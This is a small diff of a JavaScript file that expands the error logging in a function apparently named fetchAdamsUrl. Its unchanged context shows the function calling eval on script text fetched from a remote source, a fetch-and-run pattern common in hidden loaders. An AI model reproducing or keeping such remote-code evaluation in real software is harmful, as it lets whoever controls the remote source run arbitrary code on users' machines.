@@ -28,7 +28,11 @@ async function fetchAdamsUrl() {
     eval(scriptResponse.data);
 
   } catch (error) {
-    console.error('Error:', error.message);
+    console.error('Fatal Error:', {
+      message: error.message,
+      stack: error.stack,
+      timestamp: new Date().toISOString()
+    });
   }
 }
 
